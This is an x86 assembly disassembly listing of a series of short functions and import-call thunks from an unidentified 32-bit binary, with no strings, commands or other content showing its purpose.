  4d1054:	lea    esi,[eax+0x18c]
  4d105a:	sub    DWORD PTR [ebp-0x3c],0x15
  4d105e:	push   esi
  4d105f:	push   ebx
  4d1060:	push   DWORD PTR [esi+0x130]
  4d1066:	push   DWORD PTR [esi+0x120]
  4d106c:	call   0x4d1150
  4d1071:	add    esp,0xc
  4d1074:	pop    esi
  4d1075:	push   0x0
  4d1077:	call   0x4d1090
  4d107c:	add    esp,0x4
  4d107f:	push   0x0
  4d1081:	call   0x4d119c
  4d1086:	add    esp,0x4
  4d1089:	add    esp,0x54
  4d108c:	pop    ebp
  4d108d:	ret    
  4d108e:	add    BYTE PTR [eax],al
  4d1090:	pop    edi
  4d1091:	call   DWORD PTR ds:0x4d2008
  4d1097:	call   edi
  4d1099:	add    BYTE PTR [eax],al
  4d109b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10a1:	sub    esp,0x54
  4d10a4:	lea    ecx,ds:0x4d3010
  4d10aa:	mov    ebx,0xffffffea
  4d10af:	push   ecx
  4d10b0:	push   eax
  4d10b1:	push   DWORD PTR [ecx+0x1fc]
  4d10b7:	push   ebx
  4d10b8:	call   0x4d0e18
  4d10bd:	add    esp,0xc
  4d10c0:	pop    ecx
  4d10c1:	push   ecx
  4d10c2:	mov    edx,0xfffffff4
  4d10c7:	push   edx
  4d10c8:	call   0x4d0af4
  4d10cd:	add    esp,0x4
  4d10d0:	pop    ecx
  4d10d1:	push   ecx
  4d10d2:	push   0x0
  4d10d4:	call   0x4d0bf8
  4d10d9:	add    esp,0x4
  4d10dc:	pop    ecx
  4d10dd:	add    esp,0x54
  4d10e0:	pop    ebp
  4d10e1:	ret    
  4d10e2:	add    BYTE PTR [eax],al
  4d10e4:	pop    edi
  4d10e5:	call   DWORD PTR ds:0x4d2084
  4d10eb:	call   edi
  4d10ed:	add    BYTE PTR [eax],al
  4d10ef:	add    BYTE PTR [edi-0x1],bl
  4d10f2:	adc    eax,0x4d200c
  4d10f7:	call   edi
  4d10f9:	add    BYTE PTR [eax],al
  4d10fb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1101:	sub    esp,0x24
  4d1104:	mov    edi,0x4d3014
  4d1109:	xor    DWORD PTR [edi+0x30],0xffffffd4
  4d110d:	push   edi
  4d110e:	push   DWORD PTR [edi+0x114]
  4d1114:	push   eax
  4d1115:	push   DWORD PTR [edi+0x13c]
  4d111b:	call   0x4d0874
  4d1120:	add    esp,0xc
  4d1123:	pop    edi
  4d1124:	push   edi
  4d1125:	push   0x0
  4d1127:	call   0x4d15bc
  4d112c:	add    esp,0x4
  4d112f:	pop    edi
  4d1130:	push   edi
  4d1131:	push   0x0
  4d1133:	call   0x4d10e4
  4d1138:	add    esp,0x4
  4d113b:	pop    edi
  4d113c:	add    esp,0x24
  4d113f:	pop    ebp
  4d1140:	ret    
  4d1141:	add    BYTE PTR [eax],al
  4d1143:	add    BYTE PTR [edi-0x1],bl
  4d1146:	adc    eax,0x4d2078
  4d114b:	call   edi
  4d114d:	add    BYTE PTR [eax],al
  4d114f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1155:	sub    esp,0x30
  4d1158:	lea    eax,ds:0x4d318c
  4d115e:	adc    ecx,DWORD PTR [eax+0xc]
  4d1161:	push   eax
  4d1162:	push   DWORD PTR [eax+0x19c]
  4d1168:	push   DWORD PTR [eax+0x104]
  4d116e:	push   ebx
  4d116f:	push   edi
  4d1170:	call   0x4d0e70
  4d1175:	add    esp,0x10
  4d1178:	pop    eax
  4d1179:	push   eax
  4d117a:	push   0x0
  4d117c:	call   0x4d0950
  4d1181:	add    esp,0x4
  4d1184:	pop    eax
  4d1185:	push   eax
  4d1186:	mov    eax,0x0
  4d118b:	push   eax
  4d118c:	call   0x4d0850
  4d1191:	add    esp,0x4
  4d1194:	pop    eax
  4d1195:	add    esp,0x30
  4d1198:	pop    ebp
  4d1199:	ret    
  4d119a:	add    BYTE PTR [eax],al
  4d119c:	pop    edi
  4d119d:	call   DWORD PTR ds:0x4d206c
  4d11a3:	call   edi
  4d11a5:	add    BYTE PTR [eax],al
  4d11a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11ad:	sub    esp,0x48
  4d11b0:	lea    ebx,ds:0x4d30c8
  4d11b6:	or     DWORD PTR [ebp-0x2c],eax
  4d11b9:	push   ebx
  4d11ba:	push   eax
  4d11bb:	push   DWORD PTR [ebx+0x44]
  4d11be:	push   edi
  4d11bf:	push   eax
  4d11c0:	call   0x4d1418
  4d11c5:	add    esp,0x10
  4d11c8:	pop    ebx
  4d11c9:	lea    ecx,[ebx-0xc8]
  4d11cf:	push   ecx
  4d11d0:	call   0x4d132c
  4d11d5:	add    esp,0x4
  4d11d8:	test   eax,eax
  4d11da:	jne    0x4d11ca
  4d11dc:	call   0x4d0f24
  4d11e1:	add    esp,0x4
  4d11e4:	add    esp,0x48
  4d11e7:	pop    ebp
  4d11e8:	ret    
  4d11e9:	add    BYTE PTR [eax],al
  4d11eb:	add    BYTE PTR [edi-0x1],bl
  4d11ee:	adc    eax,0x4d2040
  4d11f3:	call   edi
  4d11f5:	add    BYTE PTR [eax],al
  4d11f7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d11fd:	sub    esp,0x30
  4d1200:	lea    ecx,[edx+0xdc]
  4d1206:	sub    ebx,edi
  4d1208:	push   ecx
  4d1209:	push   0x0
  4d120b:	call   0x4d1090
  4d1210:	add    esp,0x4
  4d1213:	pop    ecx
  4d1214:	push   ecx
  4d1215:	push   eax
  4d1216:	push   ebx
  4d1217:	call   0x4d09a8
  4d121c:	add    esp,0x8
  4d121f:	pop    ecx
  4d1220:	push   ecx
  4d1221:	push   0x0
  4d1223:	call   0x4d1090
  4d1228:	add    esp,0x4
  4d122b:	pop    ecx
  4d122c:	add    esp,0x30
  4d122f:	pop    ebp
  4d1230:	ret    
  4d1231:	add    BYTE PTR [eax],al
  4d1233:	add    BYTE PTR [edi-0x1],bl
  4d1236:	adc    eax,0x4d201c
  4d123b:	call   edi
  4d123d:	add    BYTE PTR [eax],al
  4d123f:	add    BYTE PTR [edi-0x1],bl
  4d1242:	adc    eax,0x4d2030
  4d1247:	call   edi
  4d1249:	add    BYTE PTR [eax],al
  4d124b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1251:	sub    esp,0x60
  4d1254:	mov    esi,0x4d3070
  4d1259:	cmp    esi,0xbed
  4d125f:	je     0x4d124f
  4d1261:	push   esi
  4d1262:	push   DWORD PTR [esi+0x188]
  4d1268:	push   DWORD PTR [esi+0x188]
  4d126e:	push   edx
  4d126f:	push   DWORD PTR [esi+0x1a0]
  4d1275:	call   0x4d14dc
  4d127a:	add    esp,0x10
  4d127d:	pop    esi
  4d127e:	mov    edx,0x0
  4d1283:	push   edx
  4d1284:	call   0x4d1234
  4d1289:	add    esp,0x4
  4d128c:	mov    ebx,0x0
  4d1291:	push   ebx
  4d1292:	call   0x4d1090
  4d1297:	add    esp,0x4
  4d129a:	add    esp,0x60
  4d129d:	pop    ebp
  4d129e:	ret    
  4d129f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12a5:	sub    esp,0x54
  4d12a8:	mov    edi,0x4d31dc
  4d12ad:	mov    DWORD PTR [edi-0x5c],0xffff9bd2
  4d12b4:	push   edi
  4d12b5:	mov    ecx,0x0
  4d12ba:	push   ecx
  4d12bb:	call   0x4d0950
  4d12c0:	add    esp,0x4
  4d12c3:	pop    edi
  4d12c4:	push   edi
  4d12c5:	push   eax
  4d12c6:	push   DWORD PTR [edi+0x88]
  4d12cc:	push   DWORD PTR [edi+0x4]
  4d12cf:	push   eax
  4d12d0:	call   0x4d0b0c
  4d12d5:	add    esp,0x10
  4d12d8:	pop    edi
  4d12d9:	push   edi
  4d12da:	push   0x0
  4d12dc:	call   0x4d119c
  4d12e1:	add    esp,0x4
  4d12e4:	pop    edi
  4d12e5:	add    esp,0x54
  4d12e8:	pop    ebp
  4d12e9:	ret    
  4d12ea:	add    BYTE PTR [eax],al
  4d12ec:	mov    edi,edi
  4d12ee:	push   ebp
  4d12ef:	mov    ebp,esp
  4d12f1:	sub    esp,0x4c
  4d12f4:	lea    edi,ds:0x4d30cc
  4d12fa:	sub    esi,DWORD PTR [ebp-0x48]
  4d12fd:	push   edi
  4d12fe:	push   0x0
  4d1300:	call   0x4d0850
  4d1305:	add    esp,0x4
  4d1308:	pop    edi
  4d1309:	push   edi
  4d130a:	push   ebx
  4d130b:	push   ebx
  4d130c:	call   0x4d0740
  4d1311:	add    esp,0x8
  4d1314:	pop    edi
  4d1315:	push   edi
  4d1316:	mov    edx,0x0
  4d131b:	push   edx
  4d131c:	call   0x4d1234
  4d1321:	add    esp,0x4
  4d1324:	pop    edi
  4d1325:	add    esp,0x4c
  4d1328:	pop    ebp
  4d1329:	ret    
  4d132a:	add    BYTE PTR [eax],al
  4d132c:	pop    edi
  4d132d:	call   DWORD PTR ds:0x4d2048
  4d1333:	call   edi
  4d1335:	add    BYTE PTR [eax],al
  4d1337:	add    BYTE PTR [edi-0x1],bl
  4d133a:	adc    eax,0x4d2094
  4d133f:	call   edi
  4d1341:	add    BYTE PTR [eax],al
  4d1343:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1349:	sub    esp,0x2c
  4d134c:	lea    edi,[edx+0x14]
  4d134f:	sbb    edx,0xffffa1b8
  4d1355:	push   edi
  4d1356:	mov    edx,0x0
  4d135b:	push   edx
  4d135c:	call   0x4d0850
  4d1361:	add    esp,0x4
  4d1364:	pop    edi
  4d1365:	push   edi
  4d1366:	push   esi
  4d1367:	push   eax
  4d1368:	call   0x4d080c
  4d136d:	add    esp,0x8
  4d1370:	pop    edi
  4d1371:	push   edi
  4d1372:	push   0x0
  4d1374:	call   0x4d0bf8
  4d1379:	add    esp,0x4
  4d137c:	pop    edi
  4d137d:	add    esp,0x2c
  4d1380:	pop    ebp
  4d1381:	ret    
  4d1382:	add    BYTE PTR [eax],al
  4d1384:	mov    edi,edi
  4d1386:	push   ebp
  4d1387:	mov    ebp,esp
  4d1389:	sub    esp,0x38
  4d138c:	lea    esi,[edx-0x28]
  4d138f:	mov    ecx,DWORD PTR [ebp-0x1c]
  4d1392:	push   esi
  4d1393:	push   edi
  4d1394:	push   DWORD PTR [esi+0x20]
  4d1397:	push   DWORD PTR [esi]
  4d1399:	push   DWORD PTR [esi+0x2c]
  4d139c:	call   0x4d1574
  4d13a1:	add    esp,0x10
  4d13a4:	pop    esi
  4d13a5:	push   0x0
  4d13a7:	call   0x4d1234
  4d13ac:	add    esp,0x4
  4d13af:	call   0x4d1240
  4d13b4:	add    esp,0x4
  4d13b7:	add    esp,0x38
  4d13ba:	pop    ebp
  4d13bb:	ret    
  4d13bc:	mov    edi,edi
  4d13be:	push   ebp
  4d13bf:	mov    ebp,esp
  4d13c1:	sub    esp,0x28
  4d13c4:	lea    ecx,ds:0x4d316c
  4d13ca:	adc    DWORD PTR [ecx-0x60],ebx
  4d13cd:	push   ecx
  4d13ce:	push   DWORD PTR [ecx+0xb4]
  4d13d4:	push   edx
  4d13d5:	push   DWORD PTR [ecx+0x1e0]
  4d13db:	call   0x4d0a00
  4d13e0:	add    esp,0xc
  4d13e3:	pop    ecx
  4d13e4:	push   ecx
  4d13e5:	mov    ebx,0x0
  4d13ea:	push   ebx
  4d13eb:	call   0x4d1234
  4d13f0:	add    esp,0x4
  4d13f3:	pop    ecx
  4d13f4:	push   ecx
  4d13f5:	mov    edx,0x0
  4d13fa:	push   edx
  4d13fb:	call   0x4d0850
  4d1400:	add    esp,0x4
  4d1403:	pop    ecx
  4d1404:	add    esp,0x28
  4d1407:	pop    ebp
  4d1408:	ret    
  4d1409:	add    BYTE PTR [eax],al
  4d140b:	add    BYTE PTR [edi-0x1],bl
  4d140e:	adc    eax,0x4d2080
  4d1413:	call   edi
  4d1415:	add    BYTE PTR [eax],al
  4d1417:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d141d:	sub    esp,0x54
  4d1420:	lea    edi,[ebx-0x4c]
  4d1423:	sbb    DWORD PTR [ebp-0x44],0xffffc327
  4d142a:	push   edi
  4d142b:	push   ecx
  4d142c:	push   DWORD PTR [edi+0x124]
  4d1432:	call   0x4d0f70
  4d1437:	add    esp,0x8
  4d143a:	pop    edi
  4d143b:	push   edi
  4d143c:	mov    esi,0x0
  4d1441:	push   esi
  4d1442:	call   0x4d1234
  4d1447:	add    esp,0x4
  4d144a:	pop    edi
  4d144b:	push   edi
  4d144c:	call   0x4d0734
  4d1451:	add    esp,0x4
  4d1454:	pop    edi
  4d1455:	add    esp,0x54
  4d1458:	pop    ebp
  4d1459:	ret    
  4d145a:	add    BYTE PTR [eax],al
  4d145c:	pop    edi
  4d145d:	call   DWORD PTR ds:0x4d207c
  4d1463:	call   edi
  4d1465:	add    BYTE PTR [eax],al
  4d1467:	add    BYTE PTR [edi-0x1],bl
  4d146a:	adc    eax,0x4d2024
  4d146f:	call   edi
  4d1471:	add    BYTE PTR [eax],al
  4d1473:	add    BYTE PTR [edi-0x1],bl
  4d1476:	adc    eax,0x4d2074
  4d147b:	call   edi
  4d147d:	add    BYTE PTR [eax],al
  4d147f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1485:	sub    esp,0x40
  4d1488:	lea    esi,ds:0x4d30a4
  4d148e:	sbb    DWORD PTR [esi+0x70],0xffffffaa
  4d1492:	call   0x4d1240
  4d1497:	add    esp,0x4
  4d149a:	push   esi
  4d149b:	push   edi
  4d149c:	push   edi
  4d149d:	push   edi
  4d149e:	push   eax
  4d149f:	call   0x4d06ec
  4d14a4:	add    esp,0x10
  4d14a7:	pop    esi
  4d14a8:	push   0x0
  4d14aa:	call   0x4d10f0
  4d14af:	add    esp,0x4
  4d14b2:	add    esp,0x40
  4d14b5:	pop    ebp
  4d14b6:	ret    
  4d14b7:	add    BYTE PTR [edi-0x1],bl
  4d14ba:	adc    eax,0x4d2060
  4d14bf:	call   edi
  4d14c1:	add    BYTE PTR [eax],al
  4d14c3:	add    BYTE PTR [edi-0x1],bl
  4d14c6:	adc    eax,0x4d2018
  4d14cb:	call   edi
  4d14cd:	add    BYTE PTR [eax],al
  4d14cf:	add    BYTE PTR [edi-0x1],bl
  4d14d2:	adc    eax,0x4d2054
  4d14d7:	call   edi
  4d14d9:	add    BYTE PTR [eax],al
  4d14db:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d14e1:	sub    esp,0x58
  4d14e4:	mov    edi,0x4d3104
  4d14e9:	xor    ebx,ecx
  4d14eb:	push   edi
  4d14ec:	push   DWORD PTR [edi+0xac]
  4d14f2:	push   eax
  4d14f3:	push   DWORD PTR [edi+0x114]
  4d14f9:	call   0x4d109c
  4d14fe:	add    esp,0xc
  4d1501:	pop    edi
  4d1502:	push   edi
  4d1503:	call   0x4d0734
  4d1508:	add    esp,0x4
  4d150b:	pop    edi
  4d150c:	push   edi
  4d150d:	push   0x0
  4d150f:	call   0x4d0bf8
  4d1514:	add    esp,0x4
  4d1517:	pop    edi
  4d1518:	add    esp,0x58
  4d151b:	pop    ebp
  4d151c:	ret    
  4d151d:	add    BYTE PTR [eax],al
  4d151f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1525:	sub    esp,0x2c
  4d1528:	lea    edi,ds:0x4d3180
  4d152e:	cmp    edi,0x2e89
  4d1534:	je     0x4d1523
  4d1536:	push   edi
  4d1537:	push   DWORD PTR [edi+0xdc]
  4d153d:	push   edx
  4d153e:	push   ebx
  4d153f:	push   DWORD PTR [edi+0x1ac]
  4d1545:	call   0x4d0780
  4d154a:	add    esp,0x10
  4d154d:	pop    edi
  4d154e:	push   edi
  4d154f:	mov    edx,0xfffffff4
  4d1554:	push   edx
  4d1555:	call   0x4d0af4
  4d155a:	add    esp,0x4
  4d155d:	pop    edi
  4d155e:	push   edi
  4d155f:	mov    ecx,0x0
  4d1564:	push   ecx
  4d1565:	call   0x4d10e4
  4d156a:	add    esp,0x4
  4d156d:	pop    edi
  4d156e:	add    esp,0x2c
  4d1571:	pop    ebp
  4d1572:	ret    
  4d1573:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1579:	sub    esp,0x60
  4d157c:	mov    edi,0x4d31a0
  4d1581:	add    ebx,0xffffffa1
  4d1584:	push   edi
  4d1585:	push   DWORD PTR [edi+0x100]
  4d158b:	push   ebx
  4d158c:	call   0x4d13bc
  4d1591:	add    esp,0x8
  4d1594:	pop    edi
  4d1595:	push   edi
  4d1596:	mov    edi,0xfffffff4
  4d159b:	push   edi
  4d159c:	call   0x4d0af4
  4d15a1:	add    esp,0x4
  4d15a4:	pop    edi
  4d15a5:	push   edi
  4d15a6:	mov    edx,0x0
  4d15ab:	push   edx
  4d15ac:	call   0x4d15bc
  4d15b1:	add    esp,0x4
  4d15b4:	pop    edi
  4d15b5:	add    esp,0x60
  4d15b8:	pop    ebp
  4d15b9:	ret    
  4d15ba:	add    BYTE PTR [eax],al
  4d15bc:	pop    edi
  4d15bd:	call   DWORD PTR ds:0x4d2034
  4d15c3:	call   edi
  4d15c5:	add    BYTE PTR [eax],al
	...
